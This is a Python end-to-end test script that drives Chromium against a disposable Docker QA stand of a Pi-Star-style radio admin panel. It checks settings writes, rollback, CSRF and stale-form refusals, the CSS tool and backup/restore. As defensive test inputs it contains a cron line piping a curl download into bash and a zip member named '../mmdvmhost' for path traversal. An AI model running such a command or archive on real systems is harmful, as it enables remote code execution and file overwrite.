#!/usr/bin/env python3
"""Exercise real settings and signed archive transactions on a disposable QA stand."""

import argparse
from hashlib import sha256
from ipaddress import ip_address
import json
from pathlib import Path
import re
import subprocess
import sys
from tempfile import TemporaryDirectory
from urllib.parse import quote, urlsplit
from zipfile import BadZipFile, ZipFile

from admin_e2e import Admin, cdp
from fixtures.chromium_https import chromium
from full_ui import ELEMENT, equal, tid
from smoke import wait


NAMES = ("MMDVM-Host.ini", "DMRGateway.ini")
INITIAL = {"callsign": "DEMO1", "master": "192.0.2.11"}
CHANGED = {"callsign": "DEMO2", "master": "192.0.2.12"}
RESTARTS = ["dmrgateway.service ok", "mmdvmhost.service ok"]
FAILED_AND_RECOVERED = ["dmrgateway.service ok", "mmdvmhost.service fail", *RESTARTS]
EVENTS = "/run/pistar-qa/events"
FAULT = "/run/pistar-qa/fail-next-mmdvmhost"
STATE = "/var/lib/pistar-panel-config/"


def loopback_origin(value):
    try:
        u = urlsplit(value)
        if (not re.fullmatch(r"https://(?:localhost|[0-9.]+|\[[0-9a-fA-F:]+\]):[0-9]+/?", value)
                or not u.port or (u.hostname != "localhost" and not ip_address(u.hostname).is_loopback)):
            raise ValueError
        host = f"[{u.hostname}]" if ":" in u.hostname else u.hostname
        return f"https://{host}" + (f":{u.port}" if u.port != 443 else "")
    except ValueError:
        raise argparse.ArgumentTypeError("expected a loopback HTTPS origin with an explicit port") from None


def stand_name(value):
    if not re.fullmatch(r"pstar-write-qa-[a-z0-9]+", value):
        raise argparse.ArgumentTypeError("expected pstar-write-qa-[a-z0-9]+")
    return value


def same_pair(stage, actual, expected):
    equal(stage + " file count", len(actual), len(NAMES))
    for name, got, want in zip(NAMES, actual, expected):
        if got != want:
            raise AssertionError(f"{stage}: {name} expected SHA256 {sha256(want).hexdigest()}, "
                                 f"got {sha256(got).hexdigest()}")


def changed_pair(originals):
    # Construct the oracle from just the two fixture lines. Preserve all other
    # bytes, including comments, private fields, line endings and final newline.
    result = []
    for data, key, field in zip(originals, (b"Callsign", b"Address"), INITIAL):
        old = key + b"=" + INITIAL[field].encode()
        new = key + b"=" + CHANGED[field].encode()
        equal(f"dummy fixture line {key.decode()}", data.splitlines().count(old), 1)
        equal(f"unique {key.decode()} replacement", data.count(old), 1)
        result.append(data.replace(old, new))
    return tuple(result)


class Stand:
    def __init__(self, name):
        self.name = stand_name(name)

    def exec(self, *args, check=True):
        return subprocess.run(["docker", "exec", "--user", "0", self.name, *args], check=check,
                              stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, timeout=15)

    def read(self, path):
        return self.exec("cat", path).stdout

    def exists(self, path):
        result = self.exec("test", "-e", path, check=False)
        if result.returncode == 1:
            return False
        result.check_returncode()
        return True

    def pair(self):
        return tuple(self.read("/etc/" + name) for name in NAMES)

    def restarts(self):
        return self.read(EVENTS).decode().splitlines() if self.exists(EVENTS) else []

    def check_state(self, stage, live, previous, restarts):
        same_pair(stage, self.pair(), live)
        equal(stage + " restart history", self.restarts(), restarts)
        equal(stage + " unconsumed fault", self.exists(FAULT), False)
        equal(stage + " pending recovery", self.exists(STATE + "pending.json"), False)
        snapshot = self.read(STATE + "previous.json")
        same_pair(stage + " rollback snapshot", [s.encode() for s in json.loads(snapshot)], previous)
        return snapshot


def apply_settings(v, fail=False):
    v.nav("settings")
    v.ready(INITIAL)
    for field, value in CHANGED.items():
        v.type_into(tid("settings-" + field), value)
    v.settings("apply")
    if fail:
        v.notice("error", "Мастер не выполнил операцию")
    else:
        v.notice("status", "применены и перечитаны")
        v.ready(CHANGED)


def exercise(v, stand, folder, original, changed):
    """Station settings: apply, confirmed operator rollback and an injected service failure."""
    history = stand.restarts()
    v.ready(INITIAL)
    apply_settings(v)
    history += RESTARTS
    stand.check_state("settings applied", changed, original, history)
    print("PASS on-disk settings: Callsign=DEMO1 -> DEMO2; master Address=192.0.2.11 -> 192.0.2.12; "
          "all other bytes unchanged; applied SHA256: " +
          ", ".join(f"{name} {sha256(data).hexdigest()}" for name, data in zip(NAMES, changed)), flush=True)

    v.settings("rollback")
    same_pair("opening confirmation did not write", stand.pair(), changed)
    equal("opening confirmation did not restart services", stand.restarts(), history)
    v.settings("confirm-rollback")
    v.notice("status", "настройки восстановлены и перечитаны")
    v.ready(INITIAL)
    history += RESTARTS
    same_pair("operator rollback", stand.pair(), original)
    equal("operator rollback consumed snapshot", stand.exists(STATE + "previous.json"), False)
    equal("operator rollback left no pending transaction", stand.exists(STATE + "pending.json"), False)
    equal("operator rollback restart order", stand.restarts(), history)
    print("PASS confirmed operator rollback: both original files byte-identical, previous.json consumed", flush=True)

    stand.exec("touch", FAULT)
    apply_settings(v, fail=True)
    history += FAILED_AND_RECOVERED
    same_pair("failed settings apply", stand.pair(), original)
    equal("failed settings apply restarts", stand.restarts(), history)
    equal("failed settings apply consumed the fault", stand.exists(FAULT), False)
    equal("failed settings apply left no pending transaction", stand.exists(STATE + "pending.json"), False)
    v.nav("services")  # leave the page so the form is read again from the server
    v.nav("settings")
    v.ready(INITIAL)
    print("PASS injected settings failure: both files restored, service recovery order, no pending state, UI reread", flush=True)


def exercise_services(v, stand, original):
    v.nav("services")
    cc, rule = 'input[name=cc]', 'input[name=rule0]'
    def loaded():
        alert = v.js("return document.querySelector('[role=alert]')?.innerText")
        if alert:
            raise AssertionError("DMR editor: " + alert)
        return v.field(rule)
    wait("DMR controls did not load", loaded)
    api = '/manage/api/services'
    def request(js, *args):
        return v.command('/execute/async', {'script':js,'args':list(args)})
    old = request("fetch(arguments[0]).then(r=>r.json()).then(arguments[arguments.length-1])",api)
    def post(body, token):
        return request("""const [url,body,csrf,done]=arguments;
          fetch(url,{method:'POST',headers:{'Content-Type':'application/json','X-PiStar-CSRF':csrf},
          body:JSON.stringify(body)}).then(r=>done(r.status))""",api,body,token)
    history = stand.restarts()
    equal("missing CSRF",post(old['config'],''),403)
    equal("invalid TG slot",post(dict(old['config'],rules=['0,1,2,1,1',*old['config']['rules'][1:]]),old['csrf']),422)
    same_pair("rejected submissions",stand.pair(),original)
    equal("rejected submissions: no restarts",stand.restarts(),history)
    expected = (original[0].replace(b'ColorCode=1\n',b'ColorCode=7\n'),
                original[1].replace(b'TGRewrite0=2,91,2,91,1\n',b'TGRewrite0=2,91,2,310,1\n'))
    assert all(a!=b for a,b in zip(original,expected))
    v.type_into(cc,'7')
    v.type_into(rule,'2,91,2,310,1')
    v.click('form button')
    wait("save not acknowledged",lambda:v.js("return document.querySelector('[role=status]')?.innerText.includes('сохранены')"))
    history += RESTARTS
    stand.check_state("DMR saved",expected,original,history)
    equal("stale revision",post(old['config'],old['csrf']),409)
    stand.check_state("stale DMR form",expected,original,history)
    v.nav('settings')
    v.nav('services')
    wait("DMR readback",lambda:v.js("return document.querySelector('[name=cc]')?.value==='7' && document.querySelector('[name=rule0]')?.value==='2,91,2,310,1'"))
    v.nav('settings')
    v.ready(INITIAL)
    v.settings("rollback")
    v.settings("confirm-rollback")
    v.notice("status","настройки восстановлены и перечитаны")
    same_pair("DMR rollback",stand.pair(),original)
    equal("DMR rollback restart order",stand.restarts(),history+RESTARTS)
    assert not stand.exists(STATE+'previous.json')
    print("PASS Chromium DMR services: ColorCode 1 -> 7, TGRewrite0 destination 91 -> 310; "
          "fresh GET, exact two-INI comparison, confirmed rollback; CSRF 403, invalid rule 422, stale 409, no extra restarts",flush=True)


def exercise_expert(v, stand, origin, original):
    """Expert Quick Edit and Full Edit through Chromium against the real helper."""
    host, gw = original

    def go(fragment, ready):
        v.command("/url", {"url": origin + "/manage/#expert"})
        v.command("/url", {"url": origin + "/manage/#" + fragment})
        wait(fragment + " did not load", lambda: v.js(ready))

    def post(api, body, csrf):
        return v.command('/execute/async', {'script': """const [url,body,csrf,done]=arguments;
          fetch(url,{method:'POST',headers:{'Content-Type':'application/json','X-PiStar-CSRF':csrf},
          body:JSON.stringify(body)}).then(r=>done(r.status))""", 'args': [api, body, csrf]})

    cc = 'input[aria-label="DMR ColorCode"]'
    go("expert-mmdvmhost", f"return document.querySelector('{cc}')?.value === '1'")
    history = stand.restarts()
    # 1. change one value
    v.type_into(cc, "5")
    v.click('form input[type=submit]')
    wait("Quick Edit save not acknowledged", lambda: v.js("return document.body.innerText.includes('Changes applied.')"))
    host5 = host.replace(b"ColorCode=1\n", b"ColorCode=5\n")
    assert host5 != host
    same_pair("Quick Edit ColorCode 1 -> 5", stand.pair(), (host5, gw))
    history += ["mmdvmhost.service ok"]
    equal("Quick Edit restarts", stand.restarts(), history)
    # 2. reopen shows the stored value
    go("expert-mmdvmhost", f"return document.querySelector('{cc}')?.value === '5'")
    # 3. unchanged form writes nothing and restarts nothing
    v.click('form input[type=submit]')
    wait("no-op save not acknowledged", lambda: v.js("return document.body.innerText.includes('Changes applied.')"))
    same_pair("Quick Edit no-op save", stand.pair(), (host5, gw))
    equal("Quick Edit no-op restarts", stand.restarts(), history)
    # 4. stale form: the file changes underneath the open page
    go("expert-mmdvmhost", f"return document.querySelector('{cc}')?.value === '5'")
    stand.exec("sed", "-i", "s/^ColorCode=5$/ColorCode=6/", "/etc/MMDVM-Host.ini")
    host6 = host.replace(b"ColorCode=1\n", b"ColorCode=6\n")
    v.type_into(cc, "7")
    v.click('form input[type=submit]')
    wait("stale save not refused", lambda: v.js("return document.body.innerText.includes('changed since this page was loaded')"))
    same_pair("Quick Edit stale form", stand.pair(), (host6, gw))
    equal("Quick Edit stale restarts", stand.restarts(), history)
    # 5. missing CSRF header
    state = v.command('/execute/async', {'script': "fetch(arguments[0]).then(r=>r.json()).then(arguments[arguments.length-1])",
                                         'args': ["/manage/api/expert/mmdvmhost"]})
    equal("Quick Edit without CSRF", post("/manage/api/expert/mmdvmhost", {"revision": state["revision"], "values": {"DMR": {"ColorCode": "9"}}}, ""), 403)
    same_pair("Quick Edit CSRF refusal", stand.pair(), (host6, gw))
    # 6. Full Edit DMRGateway: whole file, restarts MMDVMHost then DMRGateway
    go("expert-full-dmrgateway", "return document.querySelector('textarea')?.value.includes('[General]')")
    new_gw = gw.decode().replace("[General]", "# edited in Full Edit\n[General]", 1)
    v.js("const t=document.querySelector('textarea'); t.value=arguments[0]; t.dispatchEvent(new Event('input',{bubbles:true}))", new_gw)
    v.click('form input[type=submit]')
    wait("Full Edit save not acknowledged", lambda: v.js("return document.body.innerText.includes('Changes applied.')"))
    same_pair("Full Edit DMRGateway", stand.pair(), (host6, new_gw.encode()))
    history += ["mmdvmhost.service ok", "dmrgateway.service ok"]
    equal("Full Edit restarts", stand.restarts(), history)
    equal("Full Edit DMRGateway mode", stand.exec("stat", "-c", "%U:%G %a", "/etc/DMRGateway.ini").stdout.decode().strip(), "mmdvm:mmdvm 600")
    # 7. System Cron refuses blocked patterns without touching the file
    cron_before = stand.read("/etc/crontab") if stand.exists("/etc/crontab") else None
    go("expert-full-cron", "return !!document.querySelector('textarea')")
    v.js("const t=document.querySelector('textarea'); t.value=arguments[0]; t.dispatchEvent(new Event('input',{bubbles:true}))",
         "*/5 * * * * root curl http://example.invalid/x | bash\n")
    v.click('form input[type=submit]')
    wait("blocked cron line not reported", lambda: v.js("return document.body.innerText.includes('pipes downloaded content directly into a shell')"))
    equal("System Cron unchanged", stand.read("/etc/crontab") if stand.exists("/etc/crontab") else None, cron_before)
    equal("System Cron restarts", stand.restarts(), history)
    print("PASS Chromium Expert: Quick Edit ColorCode 1 -> 5 with exact file comparison and one MMDVMHost restart, "
          "reopen shows 5, unchanged form writes nothing, stale form 409 keeps the newer file, missing CSRF 403; "
          "Full Edit DMRGateway writes the whole text, keeps mmdvm:mmdvm 600 and restarts MMDVMHost then DMRGateway; "
          "System Cron refuses a blocked pattern without writing", flush=True)


def exercise_configure(v, stand, origin, original):
    """Configuration page (admin/configure.php) through Chromium against the real helper."""
    host, gw = original
    marker = "/etc/dstar-radio.mmdvmhost"
    stand.exec("sh", "-c", f"printf '[Modem]\\nHardware=zumspotgpio\\n' > {marker}; mkdir -p /etc/pistar-wizard; "
               "printf '#!/bin/sh\\necho \"$*\" >> /run/pistar-qa/systemd-run\\n' > /usr/bin/systemd-run; chmod 755 /usr/bin/systemd-run")
    marker_text = stand.read(marker)

    def load():
        v.command("/url", {"url": origin + "/manage/#expert"})
        v.command("/url", {"url": origin + "/manage/#configuration"})
        wait("configuration did not load", lambda: v.js("return document.querySelectorAll('.section h2').length > 3"))

    def apply_first():
        v.js("document.querySelector('.section input[value=\"Apply Changes\"]').click()")

    def message(fragment):
        wait("expected: " + fragment, lambda: fragment in v.js("return document.body.innerText"))

    def post(body):
        return v.command('/execute/async', {'script': """const [body,done]=arguments;
          fetch('/manage/api/configure').then(r=>r.json()).then(s=>fetch('/manage/api/configure',{method:'POST',
          headers:{'Content-Type':'application/json','X-PiStar-CSRF':s.csrf},body:JSON.stringify({revision:s.revision,form:body})}))
          .then(async r=>done([r.status, await r.text()]))""", 'args': [body]})

    load()
    titles = v.js("return [...document.querySelectorAll('.section h2')].map(h => h.textContent)")
    for t in ("Gateway Hardware Information", "Control Software", "MMDVMHost Configuration", "General Configuration",
              "DMR Configuration", "Firewall Configuration", "Remote Access Password"):
        assert t in titles, (t, titles)
    history = stand.restarts()
    # 1. an untouched form writes nothing and restarts nothing
    print("configure step: 1. an untouched form writes nothing and restarts nothing", flush=True)
    apply_first()
    message("Your configuration has been applied.")
    same_pair("untouched Configuration", stand.pair(), original)
    equal("untouched Configuration restarts", stand.restarts(), history)
    equal("untouched Configuration marker", stand.read(marker), marker_text)
    # 2. one field: DMR Colour Code 1 -> 7 changes exactly that line and restarts the radio services
    print("configure step: 2. one field: DMR Colour Code 1 -> 7 changes exactly that line and restarts the radio services", flush=True)
    load()
    v.js("const s=document.querySelector('select[aria-label=\"dmrColorCode\"]'); s.value='7'; s.dispatchEvent(new Event('change',{bubbles:true}))")
    apply_first()
    message("Your configuration has been applied.")
    host7 = host.replace(b"ColorCode=1\n", b"ColorCode=7\n")
    assert host7 != host
    same_pair("Configuration Colour Code 1 -> 7", stand.pair(), (host7, gw))
    history += ["dmrgateway.service ok", "mmdvmhost.service ok"]
    equal("Configuration restarts", stand.restarts(), history)
    load()
    equal("Colour Code reread", v.js("return document.querySelector('select[aria-label=\"dmrColorCode\"]').value"), "7")
    # 3. invalid input is refused (422) without writes
    print("configure step: 3. invalid input is refused (422) without writes", flush=True)
    status, body = post({"dmrColorCode": "99"})
    equal("invalid Colour Code status", status, 422)
    same_pair("invalid Colour Code", stand.pair(), (host7, gw))
    equal("invalid Colour Code restarts", stand.restarts(), history)
    # 4. a stale page is refused (409) and keeps the newer file
    print("configure step: 4. a stale page is refused (409) and keeps the newer file", flush=True)
    load()
    stand.exec("sed", "-i", "s/^Beacons=0$/Beacons=1/", "/etc/MMDVM-Host.ini")
    hostb = host7.replace(b"Beacons=0\n", b"Beacons=1\n")
    v.js("const s=document.querySelector('select[aria-label=\"dmrColorCode\"]'); s.value='3'; s.dispatchEvent(new Event('change',{bubbles:true}))")
    apply_first()
    message("changed since this page was loaded")
    same_pair("stale Configuration", stand.pair(), (hostb, gw))
    equal("stale Configuration restarts", stand.restarts(), history)
    # 5. Remote Access Password: its own form, written 0600, no radio restart, mismatch refused
    print("configure step: 5. Remote Access Password: its own form, written 0600, no radio restart, mismatch refused", flush=True)
    load()
    v.type_into('input[aria-label="Password"]', "qa-Secret-1")
    v.type_into('input[aria-label="Confirm Password"]', "qa-Secret-2")
    v.js("[...document.querySelectorAll('input[type=button]')].find(b => b.value === 'Set Password').click()")
    message("entries do not match")
    equal("mismatched password not written", stand.exists("/etc/pistar-wizard/admin-password"), False)
    v.type_into('input[aria-label="Confirm Password"]', "qa-Secret-1")
    v.js("[...document.querySelectorAll('input[type=button]')].find(b => b.value === 'Set Password').click()")
    message("Your configuration has been applied.")
    equal("password file", stand.read("/etc/pistar-wizard/admin-password"), b"qa-Secret-1\n")
    equal("password file mode", stand.exec("stat", "-c", "%a", "/etc/pistar-wizard/admin-password").stdout.decode().strip(), "600")
    same_pair("password form leaves radio files", stand.pair(), (hostb, gw))
    equal("password form restarts", stand.restarts(), history)
    equal("HTTPS service restart scheduled", stand.read("/run/pistar-qa/systemd-run"),
          b"--quiet --collect --on-active=2 /usr/bin/systemctl restart pistar-wizard.service\n")
    stand.exec("rm", "-f", marker, "/etc/pistar-wizard/admin-password", "/usr/bin/systemd-run", "/run/pistar-qa/systemd-run")
    print("PASS Chromium Configuration: sections " + ", ".join(titles) + "; untouched Apply writes and restarts nothing; "
          "Colour Code 1 -> 7 changes exactly that line and restarts DMRGateway then MMDVMHost, reread shows 7; "
          "invalid value 422 and stale page 409 write nothing; Remote Access Password mismatch refused, "
          "then written 0600 without radio restarts", flush=True)


def exercise_css(v, stand, origin, original):
    """Expert > CSS Tool and the theme it applies, through Chromium against the real helper."""
    css = "/etc/pistar-css.ini"
    stand.exec("rm", "-f", css)

    def go(fragment, ready):
        v.command("/url", {"url": origin + "/manage/#power"})
        v.command("/url", {"url": origin + "/manage/#" + fragment})
        wait(fragment + " did not load", lambda: v.js(ready))

    def header_colour():
        return v.js("return getComputedStyle(document.querySelector('.header')).backgroundColor")

    def set_field(label, value):
        v.js("const e=document.querySelector(`[aria-label=\"${arguments[0]}\"]`); e.value=arguments[1];"
             "e.dispatchEvent(new Event(e.tagName==='SELECT'?'change':'input',{bubbles:true}))", label, value)

    tables = "return document.querySelectorAll('.contentwide form table').length === 7"
    go("expert-tool-css", tables)
    wait("default banner colour", lambda: header_colour() == "rgb(221, 75, 57)")
    equal("Lookup default", v.js("return document.querySelector('[aria-label=\"Lookup Service\"]').value"), "RadioID")
    equal("CSS file absent before save", stand.exists(css), False)
    history = stand.restarts()
    # 1. save: every shown key written in classic format, root:root 0644, no restarts
    set_field("Background Banners", "0000ff")
    set_field("BannerH1 Enabled", "1")
    set_field("BannerH1 Text", "QA Banner")
    set_field("BannerExtText Text", "")
    set_field("Lookup Service", "QRZ")
    v.click(".contentwide form input[type=submit]")
    wait("CSS save not acknowledged", lambda: v.js("return document.body.innerText.includes('Changes applied.')"))
    expected = ("[Background]\nPage=edf0f5\nContent=ffffff\nBanners=0000ff\n\n[Text]\nBanners=ffffff\nBannersDrop=303030\n\n"
                "[Tables]\nHeadDrop=8b0000\nBgEven=f7f7f7\nBgOdd=d0d0d0\n\n[Content]\nText=000000\n\n"
                "[BannerH1]\nEnabled=1\nText=QA Banner\n\n[BannerExtText]\nEnabled=0\nText=none\n\n[Lookup]\nService=QRZ\n\n")
    equal("CSS file", stand.read(css).decode(), expected)
    equal("CSS file owner and mode", stand.exec("stat", "-c", "%U:%G %a", css).stdout.decode().strip(), "root:root 644")
    equal("CSS save restarts", stand.restarts(), history)
    same_pair("CSS save leaves radio files", stand.pair(), original)
    # 2. the theme applies to the admin pages and the dashboard banner
    go("expert-tool-css", tables)
    wait("saved banner colour", lambda: header_colour() == "rgb(0, 0, 255)")
    equal("Lookup reread", v.js("return document.querySelector('[aria-label=\"Lookup Service\"]').value"), "QRZ")
    v.command("/url", {"url": origin + "/manage/"})
    wait("dashboard BannerH1", lambda: v.js("return [...document.querySelectorAll('.header h1')].some(h => h.textContent === 'QA Banner')"))
    equal("dashboard banner colour", header_colour(), "rgb(0, 0, 255)")
    # 3. a stale page is refused and keeps the newer file
    go("expert-tool-css", tables)
    stand.exec("sed", "-i", "s/^Page=edf0f5$/Page=eeeeee/", css)
    newer = stand.read(css)
    set_field("Background Content", "fafafa")
    v.click(".contentwide form input[type=submit]")
    wait("stale CSS save not refused", lambda: v.js("return document.body.innerText.includes('changed since this page was loaded')"))
    equal("stale CSS file", stand.read(css), newer)
    # 4. Factory Reset: a wrong confirmation sends nothing, RESET removes the file
    go("expert-tool-css", tables)
    v.js("window.prompt = () => 'reset'; window.alert = m => { window.__alert = m; }")
    v.js("[...document.querySelectorAll('input[type=button]')].find(b => b.value === 'Factory Reset').click()")
    wait("wrong confirmation not reported", lambda: v.js("return window.__alert === 'Confirmation text did not match. Factory reset cancelled.'"))
    equal("wrong confirmation keeps the file", stand.read(css), newer)
    v.js("window.prompt = () => 'RESET'")
    v.js("[...document.querySelectorAll('input[type=button]')].find(b => b.value === 'Factory Reset').click()")
    wait("reset not acknowledged", lambda: v.js("return document.body.innerText.includes('Loading fresh configuration file(s)...')"))
    equal("CSS file removed", stand.exists(css), False)
    go("expert-tool-css", tables)
    try:
        wait("default colour after reset", lambda: header_colour() == "rgb(221, 75, 57)")
    except AssertionError:
        print("DEBUG css:", header_colour(), stand.exists(css), v.command('/execute/async', {'script':
              "fetch('/manage/api/dashboard',{cache:'no-store'}).then(async r=>arguments[0]([r.status,(await r.text()).slice(-400)]))", 'args': []}), flush=True)
        raise
    equal("CSS restarts", stand.restarts(), history)
    print("PASS Chromium CSS Tool: defaults shown without a file; save writes the classic file (root:root 644, empty value as none) "
          "without restarts; banner colour and BannerH1 applied on admin pages and the dashboard, QRZ lookup saved and reread; stale page 409 "
          "keeps the newer file; Factory Reset refuses a wrong confirmation and RESET removes the file, restoring the palette", flush=True)


def exercise_backup(v, stand, origin, folder, original):
    """Classic Backup/Restore through Chromium against the real helper."""
    import base64
    import io
    host, gw = original
    v.command("/url", {"url": origin + "/manage/#backup"})
    wait("backup page did not load", lambda: v.js("return !!document.querySelector('input[type=file]')"))
    blob = v.command('/execute/async', {'script': """fetch('/manage/api/backup/classic').then(async r => {
        const b = new Uint8Array(await r.arrayBuffer()); let s=''; for (const x of b) s += String.fromCharCode(x);
        arguments[arguments.length-1]([r.status, r.headers.get('content-disposition'), btoa(s)]); })""", 'args': []})
    equal("backup status", blob[0], 200)
    assert re.search(r'filename="Pi-Star_Config_[^"]+_\d{4}-[A-Z][a-z]{2}-\d{2}\.zip"', blob[1]), blob[1]
    archive = base64.b64decode(blob[2])
    with ZipFile(io.BytesIO(archive)) as z:
        names = set(z.namelist())
        equal("backup mmdvmhost", z.read("mmdvmhost"), host)
        equal("backup dmrgateway", z.read("dmrgateway"), gw)
    assert not any(n.endswith(".php") for n in names), names
    history = stand.restarts()
    # change both files, then restore the archive through the page
    stand.exec("sed", "-i", "s/^Callsign=DEMO1$/Callsign=CHANGED/", "/etc/MMDVM-Host.ini")
    stand.exec("sed", "-i", "s/^Address=192.0.2.11$/Address=192.0.2.99/", "/etc/DMRGateway.ini")
    assert stand.pair() != original
    path = folder / "restore.zip"
    path.write_bytes(archive)
    v.choose_file("input[type=file]", path)
    v.js("window.confirm = () => true")
    v.click("button.icon")
    wait("restore did not finish", lambda: v.js("return document.body.innerText.includes('Configuration restored.')"))
    same_pair("restored files", stand.pair(), original)
    equal("restore modes", stand.exec("stat", "-c", "%a", "/etc/MMDVM-Host.ini", "/etc/DMRGateway.ini").stdout.decode().split(), ["644", "644"])
    history += ["dmrgateway.service ok", "mmdvmhost.service ok"]
    equal("restore restarts", stand.restarts(), history)
    # an unsafe archive is refused without touching anything
    bad = io.BytesIO()
    with ZipFile(bad, "w") as z:
        z.writestr("../mmdvmhost", "[General]\nCallsign=EVIL\n")
    path.write_bytes(bad.getvalue())
    v.command("/url", {"url": origin + "/manage/#expert"})
    v.command("/url", {"url": origin + "/manage/#backup"})
    wait("backup page did not reload", lambda: v.js("return !!document.querySelector('input[type=file]')"))
    v.choose_file("input[type=file]", path)
    v.js("window.confirm = () => true")
    v.click("button.icon")
    wait("unsafe archive not refused", lambda: v.js("return document.body.innerText.includes('has an unsafe name')"))
    same_pair("refused archive", stand.pair(), original)
    equal("refused archive restarts", stand.restarts(), history)
    print("PASS Chromium Backup/Restore: classic zip download (Pi-Star_Config_<host>_<Y-M-d>.zip, classic member names, "
          "exact file bytes, no PHP), restore of changed files back to the archive with modes kept and DMRGateway then "
          "MMDVMHost restarted, unsafe archive refused without writes or restarts", flush=True)


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--origin", type=loopback_origin, required=True)
    parser.add_argument("--services", action="store_true")
    parser.add_argument("--expert", action="store_true")
    parser.add_argument("--backup", action="store_true")
    parser.add_argument("--configure", action="store_true")
    parser.add_argument("--css", action="store_true")
    parser.add_argument("--key", type=Path, required=True)
    parser.add_argument("--work", type=Path, required=True)
    parser.add_argument("--container", type=stand_name, required=True)
    args = parser.parse_args()
    stand = Stand(args.container)
    original = stand.pair()
    changed = changed_pair(original)
    password = (args.work / "admin-password").read_text().rstrip("\r\n")
    if not password:
        raise ValueError("empty stand admin-password")
    # Snap Chromium's private /tmp cannot see the coordinator's work directory.
    shared = Path.home() / "snap/chromium/common"
    shared.mkdir(parents=True, exist_ok=True)
    # TemporaryDirectory creates a mode-0700 directory for both download and upload.
    with TemporaryDirectory(prefix="write-browser-", dir=shared) as folder:
        with chromium(args.origin, args.key) as command:
            auth = args.origin.replace("://", f"://pi-star:{quote(password, safe='')}@", 1)
            command("/url", {"url": auth + "/manage/"})
            cdp(command, "Browser.setDownloadBehavior", behavior="allow", downloadPath=folder)
            v = Admin(command, args.origin + "/manage/", 1280, 900, False)
            # /manage/ is the classic admin page; the station settings, DMR
            # services and backup pages live under their own sections.
            if not (args.expert or args.backup or args.configure or args.css):
                command("/url", {"url": args.origin + "/manage/#settings"})
                wait("workspace menu did not load", lambda: v.js("return !!document.querySelector('nav a[href=\"#services\"]')"))
            try:
                run_scenario(args, v, stand, folder, original, changed)
            except AssertionError:
                print("DEBUG page:", v.js("return location.href + ' :: ' + document.body.innerHTML.slice(0, 2500)"), flush=True)
                try:
                    print("DEBUG console:", v.command("/se/log", {"type": "browser"}), flush=True)
                except Exception as e:
                    print("DEBUG console unavailable:", e, flush=True)
                raise


def run_scenario(args, v, stand, folder, original, changed):
    if args.expert:
        exercise_expert(v, stand, args.origin, original)
    elif args.backup:
        exercise_backup(v, stand, args.origin, Path(folder), original)
    elif args.configure:
        exercise_configure(v, stand, args.origin, original)
    elif args.css:
        exercise_css(v, stand, args.origin, original)
    elif args.services:
        exercise_services(v, stand, original)
    else:
        exercise(v, stand, Path(folder), original, changed)


if __name__ == "__main__":
    try:
        main()
    except (AssertionError, BadZipFile, OSError, RuntimeError, ValueError, subprocess.SubprocessError) as exc:
        sys.exit(f"FAIL: {exc}")
